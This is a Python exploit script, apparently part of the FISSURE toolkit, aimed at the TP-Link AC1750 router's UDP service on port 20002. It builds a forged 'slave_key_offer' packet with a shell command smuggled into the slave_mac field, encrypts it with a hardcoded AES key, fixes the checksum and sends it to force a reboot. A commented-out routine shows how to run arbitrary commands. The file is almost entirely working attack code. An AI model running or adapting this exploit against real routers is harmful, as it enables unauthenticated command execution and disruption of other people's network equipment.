import requests
import argparse
import random
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys
from time import sleep
from Crypto.Cipher import AES
import binascii
import socket
from struct import pack
from random import randint
import os

#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    iface = 'wlan0'	                    # Wireless interface name 
    tp_link_ip = '192.168.1.1'          # IP of the TP-Link AC1750
    notes = 'While joined to the network, executes a reboot command on the device using a single UDP message.'
    
    arg_names = ['iface','tp_link_ip','notes']
    arg_values = [iface,tp_link_ip,notes]

    return (arg_names,arg_values)
    
#################################################


def crc(data, poly, rev2, init, out):
        ''' Receives an ascii binary string and returns it's crc-16 checksum '''
        #data_hex = data
        #input = data_hex
        #crc_func = crcmod.mkCrcFun(poly, rev=rev2, initCrc=init, xorOut=out)
        checksum = hex(binascii.crc32(data) & 0xffffffff)
        return checksum

def calc_checksum(packet):
    print("Calculating checksum")
    sys.stdout.flush()
    checksum = crc(packet,0x104C11DB7,True,0x00000000,0xFFFFFFFF)
    print("Got checksum as %s" % (checksum))
    sys.stdout.flush()

    new_packet = b''
    new_packet += packet[:12]
    new_packet += pack('>I', int(checksum,16)) #packing.p32(int(checksum,16), endian="big")
    new_packet += packet[16:]

    return new_packet



def aes_encrypt(plaintext):
    if len(plaintext)%16 != 0:
        print("Plaintext isn't 16 byte aligned. It's off by %d" %(len(plaintext)%16))
        sys.stdout.flush()
        return

    # in the original C code the key and IV are 256 bits long... but they still use AES-128
    iv = b"1234567890abcdef"
    key = b"TPONEMESH_Kf!xn?"


    enc = ""    
    try:
        aes = AES.new(key, AES.MODE_CBC, iv)
        encd = aes.encrypt(plaintext)
    except:
        aes = AES.new(key, AES.MODE_CBC, iv=iv)
        encd = aes.encrypt(plaintext.encode())

    return encd

def create_injection(command):
    inject = command

    template = "{\"method\":\"slave_key_offer\",\"data\":{" + \
    "\"group_id\":\""+str(randint(0,999))+"\"," + \
    "\"ip\":\""+str(randint(0,999))+"."+str(randint(0,999))+"."+str(randint(0,999))+"."+str(randint(0,999))+"\"," + \
    "\"slave_mac\":\"%{INJECTION}\"," + \
    "\"slave_private_account\":\""+str(randint(11111,999999999))+"\"," + \
    "\"slave_private_password\":\""+str(randint(11111,999999999))+"\"," + \
    "\"want_to_join\":false," + \
    "\"model\":\""+str(randint(11111,999999999))+"\"," + \
    "\"product_type\":\""+str(randint(11111,999999999))+"\"," + \
    "\"operation_mode\":\"A%{PADDING}\"}}"

    template_len = len(template) + len(inject) - (len("%{INJECTION}") + len("%{PADDING}"))

    pad = ''
    padding = "a"*16

    print("Template length is %d so need %d bytes of padding" % (template_len, 16-(template_len%16)))
    sys.stdout.flush()
    if template_len %16 != 0:
        pad = padding[:16-(template_len%16)]

    template = template.replace("%{INJECTION}", inject)
    template = template.replace("%{PADDING}", pad)
    print("Template length is now ", len(template))
    sys.stdout.flush()
    return template

def update_len_field(packet, payload_length):
    new_packet = b''
    new_packet += packet[:4]
    new_packet += pack('>H', payload_length) #packing.p16(payload_length, endian="big")
    new_packet += packet[6:]

    return new_packet

def exec_cmd(packet, command):
    print("Creating injection for " + command)
    sys.stdout.flush()
    #Generate payload
    payload = create_injection(command)
    if payload == None:
        print("Failed to create injection")
        sys.stdout.flush()
        return
    else:
        print("Injection template given as\n%s" % (payload)) #(json.dumps(json.loads(payload), indent=4, sort_keys=False)))
        sys.stdout.flush()


    #Encrypt payload
    ciphertext = aes_encrypt(payload)
    if ciphertext == None:
        print("Failed to create ciphertext")
        sys.stdout.flush()
        return

    tpdp_packet = bytearray(tpdp_packet_template)
    if tpdp_packet is tpdp_packet_template:
        print("Failed duplicating tpdp packet")
        sys.stdout.flush()
        return
    tpdp_packet += ciphertext
    tpdp_packet = update_len_field(tpdp_packet, len(ciphertext))

    tpdp_packet = calc_checksum(tpdp_packet)
    return tpdp_packet

def exploit(rhost, command):
    print("Starting exploit")
    sys.stdout.flush()

    print(b"Template tpdp packet: " + tpdp_packet_template)
    sys.stdout.flush()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


    # for char in command:
        # #"\';printf \'%s\'>>a\'" % (c)

        # tpdp_packet = bytearray(tpdp_packet_template)
        # tpdp_packet = exec_cmd(tpdp_packet, "\';printf \'%s\'>>%s\'" % (char, command_file))
        # print("Sending tpdp packet to %s" % (rhost))
        # sys.stdout.flush()
        # sock.sendto(tpdp_packet, (rhost, 20002))

        # sleep(0.75)

    tpdp_packet = bytearray(tpdp_packet_template)
    #tpdp_packet = exec_cmd(tpdp_packet, "\';sh "+command_file+"*\'")
    tpdp_packet = exec_cmd(tpdp_packet, "\';reboot \'")
    sock.sendto(tpdp_packet, (rhost, 20002))
    
    print("Reboot takes about 20 seconds...")
    sys.stdout.flush()
    sleep(21)


tpdp_packet_template = \
    pack('c', b'\x01') +  \
    pack('c', b'\xf0') +  \
    pack('>H', 0x07) + \
    pack('>H', 0x00) + \
    pack('c', b'\x01') + \
    pack('c', b'\x00') + \
    pack('>I', randint(0,2000000000)) + \
    pack('>I', 0x5a6b7c8d)









#################################################

if __name__ == "__main__":

    # Default Values
    iface = 'wlan0'	                    # Wireless interface name 
    tp_link_ip = '192.168.1.1'          # IP of the TP-Link AC1750

    # Accept Command Line Arguments
    try:
        iface = sys.argv[1]
        tp_link_ip = sys.argv[2]
    except:
        pass

#################################################
    
    # Run the Exploit    
    exploit(tp_link_ip,"")
